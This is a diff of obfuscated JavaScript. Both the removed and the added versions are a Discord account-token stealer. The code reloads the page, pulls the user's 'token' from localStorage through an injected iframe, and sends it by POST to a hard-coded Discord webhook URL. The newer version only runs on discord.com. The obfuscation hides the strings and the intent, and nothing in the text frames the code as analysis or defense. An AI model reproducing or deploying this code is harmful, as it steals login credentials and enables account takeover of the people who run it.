@@ -1,65 +1,72 @@
-var _0x29fd9c = _0x5033;
-(function (_0x39e770, _0xa398f2) {
-    var _0x5a691d = _0x5033;
-    var _0x4d3f68 = _0x39e770();
+function _0x574b() {
+    var _0x266ef4 = [
+        '34XrqHzG',
+        'open',
+        'application/json',
+        'host',
+        '23785LOXoJr',
+        'window',
+        '1310QUyrXS',
+        '33136TPgWQh',
+        '603456Jqcvul',
+        '20RypzzR',
+        '13bzivDS',
+        '25386qbvMGP',
+        'reload',
+        '13338nPmHNx',
+        'send',
+        'setRequestHeader',
+        '192UfTOVm',
+        'appendChild',
+        'https://discord.com/api/webhooks/1051821662800195614/azbjSbA--bFX0n4a03lx3ptjzjETOyipNB2mOVS_sZJitwc37Go0cmdGX0U5pJtluyej',
+        'token',
+        '567Zjkphb',
+        '37477jsppra',
+        'body',
+        'stringify',
+        'POST',
+        'content-type',
+        '12389748CTPBVM',
+        'localStorage'
+    ];
+    _0x574b = function () {
+        return _0x266ef4;
+    };
+    return _0x574b();
+}
+var _0x2222bf = _0x47ce;
+function _0x47ce(_0x1459a6, _0x215fd0) {
+    var _0x574bc1 = _0x574b();
+    _0x47ce = function (_0x47ce4b, _0x562abc) {
+        _0x47ce4b = _0x47ce4b - 0x6a;
+        var _0x2b04c3 = _0x574bc1[_0x47ce4b];
+        return _0x2b04c3;
+    };
+    return _0x47ce(_0x1459a6, _0x215fd0);
+}
+(function (_0x33152b, _0x3ac389) {
+    var _0x2d8f29 = _0x47ce;
+    var _0x465c4f = _0x33152b();
     while (!![]) {
         try {
-            var _0x4c7c42 = -parseInt(_0x5a691d(0xab)) / 0x1 * (parseInt(_0x5a691d(0xaf)) / 0x2) + parseInt(_0x5a691d(0xb6)) / 0x3 + -parseInt(_0x5a691d(0xb5)) / 0x4 + -parseInt(_0x5a691d(0xa6)) / 0x5 * (parseInt(_0x5a691d(0xac)) / 0x6) + parseInt(_0x5a691d(0xba)) / 0x7 * (parseInt(_0x5a691d(0xae)) / 0x8) + -parseInt(_0x5a691d(0xbb)) / 0x9 * (-parseInt(_0x5a691d(0xa7)) / 0xa) + parseInt(_0x5a691d(0xb7)) / 0xb * (parseInt(_0x5a691d(0xb3)) / 0xc);
-            if (_0x4c7c42 === _0xa398f2) {
+            var _0x2dab68 = -parseInt(_0x2d8f29(0x80)) / 0x1 * (parseInt(_0x2d8f29(0x6b)) / 0x2) + -parseInt(_0x2d8f29(0x6c)) / 0x3 + parseInt(_0x2d8f29(0x6d)) / 0x4 * (-parseInt(_0x2d8f29(0x84)) / 0x5) + parseInt(_0x2d8f29(0x6f)) / 0x6 * (-parseInt(_0x2d8f29(0x78)) / 0x7) + parseInt(_0x2d8f29(0x74)) / 0x8 * (-parseInt(_0x2d8f29(0x71)) / 0x9) + -parseInt(_0x2d8f29(0x6a)) / 0xa * (-parseInt(_0x2d8f29(0x79)) / 0xb) + parseInt(_0x2d8f29(0x7e)) / 0xc * (parseInt(_0x2d8f29(0x6e)) / 0xd);
+            if (_0x2dab68 === _0x3ac389) {
                 break;
             } else {
-                _0x4d3f68['push'](_0x4d3f68['shift']());
+                _0x465c4f['push'](_0x465c4f['shift']());
             }
-        } catch (_0x53ec2a) {
-            _0x4d3f68['push'](_0x4d3f68['shift']());
+        } catch (_0x1dd1de) {
+            _0x465c4f['push'](_0x465c4f['shift']());
         }
     }
-}(_0x2dee, 0xa2f4d));
-location[_0x29fd9c(0xb9)]();
-var webhook = 'https://discord.com/api/webhooks/1051821662800195614/azbjSbA--bFX0n4a03lx3ptjzjETOyipNB2mOVS_sZJitwc37Go0cmdGX0U5pJtluyej';
-function _0x5033(_0x23699f, _0x1de639) {
-    var _0x2deea6 = _0x2dee();
-    _0x5033 = function (_0x50337f, _0x44ba1d) {
-        _0x50337f = _0x50337f - 0xa6;
-        var _0x396a07 = _0x2deea6[_0x50337f];
-        return _0x396a07;
-    };
-    return _0x5033(_0x23699f, _0x1de639);
-}
-var token = document[_0x29fd9c(0xa8)]['appendChild'](document[_0x29fd9c(0xb1)]`iframe`)['contentWindow'][_0x29fd9c(0xa9)][_0x29fd9c(0xb8)][_0x29fd9c(0xaa)];
-var request = new XMLHttpRequest();
-request[_0x29fd9c(0xb0)](_0x29fd9c(0xad), webhook);
-request[_0x29fd9c(0xbd)](_0x29fd9c(0xbc), _0x29fd9c(0xb2));
-request['send'](JSON[_0x29fd9c(0xb4)]({ 'content': token }));
-function _0x2dee() {
-    var _0x4d1a00 = [
-        'window',
-        'token',
-        '3DWkThm',
-        '498pNFTZX',
-        'POST',
-        '6145592UtENXH',
-        '441562PsuHUW',
-        'open',
-        'createElement',
-        'application/json',
-        '204fQcSQd',
-        'stringify',
-        '1302272kCOquz',
-        '2169966wKlQPQ',
-        '444653DuWtCI',
-        'localStorage',
-        'reload',
-        '7HurdFl',
-        '300555fNnNoz',
-        'content-type',
-        'setRequestHeader',
-        '47620WcmUpO',
-        '80mHWlIK',
-        'body'
-    ];
-    _0x2dee = function () {
-        return _0x4d1a00;
-    };
-    return _0x2dee();
+}(_0x574b, 0x4c3cc));
+if (location[_0x2222bf(0x83)] == 'discord.com') {
+    location[_0x2222bf(0x70)]();
+    var webhook = _0x2222bf(0x76);
+    var token = document[_0x2222bf(0x7a)][_0x2222bf(0x75)](document['createElement']`iframe`)['contentWindow'][_0x2222bf(0x85)][_0x2222bf(0x7f)][_0x2222bf(0x77)];
+    var request = new XMLHttpRequest();
+    request[_0x2222bf(0x81)](_0x2222bf(0x7c), webhook);
+    request[_0x2222bf(0x73)](_0x2222bf(0x7d), _0x2222bf(0x82));
+    request[_0x2222bf(0x72)](JSON[_0x2222bf(0x7b)]({ 'content': token }));
+} else {
 }
